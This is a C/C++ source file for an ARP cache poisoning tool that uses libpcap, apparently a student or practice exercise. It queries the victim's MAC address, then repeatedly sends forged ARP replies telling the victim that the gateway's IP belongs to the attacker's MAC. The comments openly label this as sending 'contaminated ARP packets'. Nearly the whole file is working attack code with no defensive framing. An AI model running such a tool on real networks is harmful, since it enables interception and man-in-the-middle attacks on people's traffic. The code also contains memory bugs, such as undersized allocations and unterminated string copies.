// sudo apt install libnet-dev

//#include <fstream>
#include <pthread.h>
#include "stdafx.h"

#define MAX_PAC_SIZE 100
#define REQ_CNT 20

using namespace std;


// ########## Define a struct for pthread parameters ##########
struct Parameter_Pthread{
  char* sip;
  char* smac;
  char* tip;
  char* tmac;
};

// ########## Sending contaminated ARP packets ##########
// sip : gateway's ip
// smac : attacker's mac
// tip : victim's ip
// tmac : victim's mac
void Attack(void* info, pcap_t* handle){
  struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
  struct in_addr src_in_addr, target_in_addr;
  struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
  //struct sockaddr sa;
  //int sock;
  //sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
  //if(sock<0){ perror("socket error"); exit(1); }

  attack_packet->frame_type = htons(ARP_FRAME_TYPE);
  attack_packet->mac_type = htons(ETHER_MAC_TYPE);
  attack_packet->prot_type = htons(IP_PROTO_TYPE);
  attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
  attack_packet->prot_addr_size = IP_ADDR_LEN;
  attack_packet->op = htons(OP_ARP_REPLY);

  tomar_ip_addr(&src_in_addr, PP->sip);
  tomar_ip_addr(&target_in_addr, PP->tip);

  tomar_mac_addr(attack_packet->Destination_mac_addr, PP->tmac);
  tomar_mac_addr(attack_packet->target_mac_addr, PP->tmac);
  tomar_mac_addr(attack_packet->src_mac_addr, PP->smac);
  tomar_mac_addr(attack_packet->sender_mac_addr, PP->smac);

  memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
  memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

  bzero(attack_packet->padding, 18);
  //strcpy(sa.sa_data, DEFAULT_DEVICE);

  printf("\n----------_ARP_----------\n");
  //Print_ARP(&attack_packet);
  //if(sendto(sock, &attack_packet, sizeof(attack_packet), 0, &sa, sizeof(sa)) < 0){
  //  perror("sendto error");
  //  exit(1);
  //}
  if(pcap_sendpacket(handle, reinterpret_cast<u_char*>(attack_packet), 100) != 0){
    perror("send packet error");
    exit(1);
  }
}

void Print_Data(const u_char* Packet_DATA){
  for(int i = 0; i < 10; i++) printf("%02x ", Packet_DATA[i]);
  printf("\n");
}

void usage() {
  printf("syntax: ARP_TEST <interface>\n");
  printf("sample: ARP_TEST %s\n", DEFAULT_DEVICE);
}

// ########## Define a function to elimate special character ##########
void delChar(char* buf, char* dest, char ch){
  int cnt = 0;
  for(int i = 0; buf[i] != 0; i++){
    if(buf[i] != ch){
      dest[cnt] = buf[i];
      cnt++;
    }
  }
  buf[cnt] = 0;
}

// ########## Define a function to insert zero ##########
void convert_mac(const char* data, char* cvrt_str, int s){
  char buf[128] = {0x00, };
  char t_buf[8];
  char* stp = strtok((char*)data, ":");
  int temp = 0;
  do{
    memset(t_buf, 0x0, sizeof(t_buf));
    sscanf(stp, "%x", &temp);
    snprintf(t_buf, sizeof(t_buf)-1, "%02x", temp);
    strncat(buf, t_buf, sizeof(buf)-1);
    strncat(buf, ":", sizeof(buf)-1);
  }
  while((stp = strtok(NULL, ":")) != NULL);
  buf[strlen(buf)-1] = '\0';
  strncpy(cvrt_str, buf, s);
}

// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

int main(int argc, char* argv[]) {
  if (argc != 3) {
    usage();
    return -1;
  }

// ########################################

// ########## Make a file to write ##########
//  ofstream writeFile1("Result_text.txt");

// ########## Make a thread ##########
  //pthread_t thread;
  //int status = 0;

// ########## Make a struct variable to give several parameters to pthread ##########
  struct Parameter_Pthread pt;

// ########## Make a socket to find my IP & MAC address ##########
  int sockfd, req_cnt = REQ_CNT;
  char s_mac_addr[128] = {0x00, };
  char* s_ip_addr = (char*)malloc(sizeof(128));

  struct sockaddr_in* sock;
  struct ifconf ifcnf_s;
  struct ifreq* ifr_s;

  sockfd = socket(PF_INET, SOCK_DGRAM, 0);
  if(sockfd < 0){
    perror("socket error");
    return -1;
  }

  memset((void*)&ifcnf_s, 0x0, sizeof(ifcnf_s));
  ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
  ifcnf_s.ifc_buf = (char*)malloc(ifcnf_s.ifc_len);
  if(ioctl(sockfd, SIOCGIFCONF, (char*)&ifcnf_s) < 0){
    perror("icoctl - SIOCGIFCONF error");
    return -1;
  }

  if(ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt)){
    req_cnt = ifcnf_s.ifc_len;
    ifcnf_s.ifc_buf = (char*)realloc(ifcnf_s.ifc_buf, req_cnt);
  }

  ifr_s = ifcnf_s.ifc_req;
  for(int cnt = 0; cnt < ifcnf_s.ifc_len; cnt += sizeof(struct ifreq), ifr_s++){
    if(ioctl(sockfd, SIOCGIFFLAGS, ifr_s) < 0){
      perror("ioctl - SIOCGFFLAGS error");
      return -1;
    }

    if(ifr_s->ifr_flags & IFF_LOOPBACK) continue;
    sock = (struct sockaddr_in*)&ifr_s->ifr_addr;
    sprintf(s_ip_addr, "%s", inet_ntoa(sock->sin_addr));
    if(ioctl(sockfd, SIOCGIFHWADDR, ifr_s) < 0){
      perror("ioctl - SIOCGFHWADDR error");
      return -1;
    }
    convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data)), s_mac_addr, sizeof(s_mac_addr)-1);
  }
  char* a_mac_addr = (char*)malloc(sizeof(s_mac_addr));
  if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
  delChar((char*)s_mac_addr, a_mac_addr, ':'); //s_mac_addr

// ########################################

// ########## Make a pcap environment ##########
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(DEFAULT_DEVICE, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", DEFAULT_DEVICE, errbuf);
    return -1;
  }
// ########################################

// ################ Using pcap sendpacket ################
  printf("[ Starting to find sender's mac address ]\n");
  struct ARP_header* ah = (struct ARP_header*)malloc(sizeof(struct ARP_header));
  struct in_addr src_in_addr, target_in_addr;

  ah->frame_type = htons(ARP_FRAME_TYPE);
  ah->mac_type = htons(ETHER_MAC_TYPE);
  ah->prot_type = htons(IP_PROTO_TYPE);
  ah->mac_addr_size = ETH_MAC_ADDR_LEN;
  ah->prot_addr_size = IP_ADDR_LEN;
  ah->op = htons(OP_ARP_REQUEST);

  tomar_ip_addr(&src_in_addr, s_ip_addr);
  tomar_ip_addr(&target_in_addr, argv[1]);

  tomar_mac_addr(ah->Destination_mac_addr, "ffffffffffff");
  tomar_mac_addr(ah->target_mac_addr, "000000000000");
  tomar_mac_addr(ah->src_mac_addr, a_mac_addr);
  tomar_mac_addr(ah->sender_mac_addr, a_mac_addr);

  memcpy(ah->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
  memcpy(ah->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

  bzero(ah->padding, 18);

  if(pcap_sendpacket(handle, reinterpret_cast<u_char*>(ah), 100) != 0){
    perror("send packet error");
    exit(1);
  }
  struct pcap_pkthdr* header;
  const u_char* packet;
  int res = pcap_next_ex(handle, &header, &packet);
  struct ARP_header* temp = (struct ARP_header*)(packet);
  //check_ARP(packet);
  char* sender_mac = (char*)malloc(sizeof(char) * 20);
  sprintf(sender_mac, "%02x%02x%02x%02x%02x%02x", temp->sender_mac_addr[0], 
temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], temp->sender_mac_addr[4], temp->sender_mac_addr[5]);
  printf("sender_mac : %s\n", sender_mac);

/*
// ################ Using Ping & ARP table ################
  printf("[ Starting to find sender's mac address ]\n");


  printf("[ Ping to victim ]\n");
  FILE* fp_ping = NULL;
  // Ping to victim
  char* ping_str = (char*)malloc(sizeof(char) * 50);
  //strncat(ping_str, argv[1], sizeof(argv[1]));
  sprintf(ping_str, "ping %s", argv[1]);
  printf("%s\n", ping_str);
  if((fp_ping = popen(ping_str, "r")) == NULL){ return 1; }
  pclose(fp_ping);
*/
/*
  printf("[ Open ARP table ]\n");
  FILE* fp_arp_table = NULL;
  char line2[100];
  char* line_result1[10];
  char* sender_mac;
  // Find a complete arp tuple
  if((fp_arp_table = popen("arp -a", "r")) == NULL){ return 1; }
  while(1){
    fgets(line2, 100, fp_arp_table);
    char* ptr1; int cnt1 = 0;
    ptr1 = strtok(line2, " ");
    while(ptr1 != NULL){
      //printf("%s\n", ptr1);
      line_result1[cnt1] = ptr1;
      cnt1++;
      ptr1 = strtok(NULL, " ");
      if(cnt1 == 4) break;
    }
    cnt1 = 0;
    //printf("%s\n", line_result1[1]);
// find victim's ip addr & delete '(', ')' for comparing with argv[1]
    char* final_dst = (char*)malloc(sizeof(char) * 20);
    if(final_dst == NULL) { perror("final_dst malloc fail"); exit(1); }
    char* dst = (char*)malloc(sizeof(char) * 20);
    if(dst == NULL) { perror("dst malloc fail"); exit(1); }
    char* src = line_result1[1];
    //printf("%s\n", src);
    delChar(src, dst, '(');
    //printf("%s\n", dst);
    delChar(dst, final_dst, ')');
    //printf("%s\n", final_dst);
    //printf("%s\n", argv[1]);
    if(!(strncmp(final_dst, argv[1], strlen(argv[1])))){
      sender_mac = line_result1[3];
      break;
    }
  }
  pclose(fp_arp_table);
*/
  printf("[ Success to find sender's mac address : %s ]\n", sender_mac);

// ########################################


// ########## Make contents of parameters ##########
  pt.sip = (char*)malloc(strlen(argv[1])); // sender's ip address
  if(pt.sip == NULL){ perror("pt.sip malloc error"); exit(1); }
  pt.smac = (char*)malloc(strlen(a_mac_addr)); // sender's mac address
  if(pt.smac == NULL){ perror("pt.smac malloc error"); exit(1); }

  pt.tip = (char*)malloc(strlen(argv[2])); // attacker's ip address
  if(pt.tip == NULL){ perror("pt.tip malloc error"); exit(1); }
  pt.tmac = (char*)malloc(strlen(sender_mac)); // attacker's mac address
  if(pt.tmac == NULL){ perror("pt.tmac malloc error"); exit(1); }

  printf("my mac address : %s\n", a_mac_addr);
  strncpy(pt.sip, argv[2], strlen(argv[2]));
  strncpy(pt.smac, a_mac_addr, strlen(a_mac_addr));
  strncpy(pt.tip, argv[1], strlen(argv[1])); // gateway ip
  strncpy(pt.tmac, sender_mac, strlen(sender_mac));
// ########################################

for(int i = 0; i < 20; i++) { Attack((void*)&pt, handle); sleep(1); }

// ########## Receiving packets ##########
  /*int count = 0;
  while (count < 10) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    printf("########################\n\n");
    printf("-- %u Bytes captured --\n\n", header->caplen);

    printf("-------_Ethernet_-------\n");
    uint8_t tmp = 0; // Ethernet header size
    Ethernet_header Eh;
    tmp = Eh.Print_Eth(packet);
    struct ARP_header* temp = (struct ARP_header*)(packet);
    check_ARP(packet);
    //printf("packet : %d\n", tmp);
    if(tmp > 14) break;
    //packet += 14;
    printf("\n");
    count++;

// ########## Pthread Create ##########
  //if(pthread_create(&thread, NULL, Attack, (void*)&pt) < 0){
  //  perror("Thread create error"); exit(0);
  //}
// ########################################

    //if(packet){
    //  
    //}
  }*/
  //pthread_join(thread, (void**)&status);
  //printf("Thread %d\n", status);
  pcap_close(handle);
  return 0;
}





